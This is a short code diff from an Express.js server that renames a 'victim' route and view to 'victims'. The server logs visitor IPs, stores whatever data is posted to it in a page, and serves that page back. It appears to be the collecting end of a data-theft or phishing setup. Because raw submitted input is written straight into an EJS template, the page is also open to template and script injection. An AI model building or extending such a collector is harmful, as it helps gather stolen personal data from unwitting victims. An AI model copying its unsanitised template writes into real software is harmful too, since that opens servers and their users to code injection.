@@ -20,9 +20,9 @@ fs.appendFile('./views/log.txt',"Visit Form: "+ip+" | At:"+d+"\n\n", function (e
 if (err) throw err;
 });
 });
-app.get("/victim",(req,res)=>{res.render("victim");});
+app.get("/victims",(req,res)=>{res.render("victims");});
 app.post("/",(req,res)=>{
-fs.appendFile('./views/victim.ejs', decodeURIComponent(req.body.data)+"\n\n", function (err) {
+fs.appendFile('./views/victims.ejs', decodeURIComponent(req.body.data)+"\n\n", function (err) {
 if (err) throw err;
 console.log('Saved!');
 res.send("Done");
